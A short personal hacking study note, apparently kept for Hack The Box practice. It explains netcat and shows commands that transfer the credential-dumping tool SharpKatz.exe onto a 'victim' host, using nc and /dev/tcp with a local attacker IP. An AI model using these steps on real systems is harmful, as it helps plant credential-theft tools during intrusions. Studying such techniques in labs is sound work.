---
title: "Netcat"
tags:
  - cs/hacking
  - cs/hacking/htb
created: 2022-07-11
type: note
---
Networking utility for reading from and writing to network connections using TCP or UDP.

## Listening
```bash
victim@target:~$ nc -l -p 8080 > SharpKatz.exe
```

```bash
victim@target:~$ cat < /dev/tcp/192.168.0.200/8080 > SharpKatz.exe
```

## Sending
```bash
me@hanato:~$ nc -q 0 192.168.0.200 8080 < SharpKatz.exe
```


> [!nav]
> [[hacking-hub|Hacking]]
